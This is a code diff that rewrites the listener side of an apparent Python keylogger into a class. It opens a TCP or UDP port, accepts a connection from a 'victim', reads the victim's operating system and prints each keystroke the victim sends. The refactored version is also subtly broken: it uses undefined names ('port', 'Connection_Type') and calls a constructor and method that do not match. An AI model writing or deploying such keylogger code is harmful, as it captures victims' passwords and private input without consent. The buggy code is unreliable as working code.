@@ -1,33 +1,44 @@
-def connect(Connection_Type: str, port: int, type: str):
-    import socket
-    import os
-    from os import path
-    import sys
-    if os.name == 'nt':
-        from colorama import init
-        init(convert=True)
-    sys.path.insert(0, path.dirname(path.dirname(path.dirname(__file__))))
-    from core.helper_core import Color
-    black, red, green, yellow, blue, magenta, cyan, grey, reset = Color().GetAllColors()
-    if Connection_Type == "TCP":
-        Connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    elif Connection_Type == "UDP":
-        Connection = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+import socket
+import os
+from os import path
 
-    print("[" + blue + 'REPORT' + reset + "]  Making Connection")
-    try:
-        Connection.bind(('', int(port)))
-        Connection.listen()
-        Victim, Address = Connection.accept()
+if os.name == 'nt':
+    from colorama import init
+    init(convert=True)
 
-        os = Victim.recv(1024).decode('UTF-8')
-        print("[" + blue + 'REPORT' + reset + "]  Got Platfrom from victim")
-        Connected = True
-        while Connected:
-            key = Connection.recv(1024)
-            print("{} Pressed : {} ".format(Address, key))
-            
-    except:
-        Connected = False
-        print("[" + red + '-' + reset +
-              "] Connection Failed.Victim Might Be Offline Try Again Later")
+from core.helper_core import notify
+
+class Controller:
+    def __init__(self, conn_type, port, type_):
+        
+        notify("notify","Making Connection", "")
+        
+        try:
+            self.get_socket(conn_type)
+            self.make_the_connection()
+            os = self.conn.recv(1024).decode('UTF-8')
+            print(f"Victim is using {os}")
+            notify("report", "Got Platfrom from victim", flush=True)
+            connected = True
+            while connected:
+                key = self.conn.recv(1024)
+                print("{} Pressed : {} ".format(self.address, key))
+
+        except:
+            connected = False
+            notify("problem",
+                  "Connection Failed.Victim Might Be Offline Try Again Later")
+
+    def make_the_connection(self):
+        self.connection.bind(('', int(port)))
+        self.connection.listen()
+        self.conn, self.address = self.connection.accept()
+
+    def get_socket(self, conn_type):
+        if conn_type == "TCP":
+            self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        elif Connection_Type == "UDP":
+            self.connection = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+def connect(connection_type: str, port: int, type_: str):
+    Controller().connect(connection_type, port, type_)
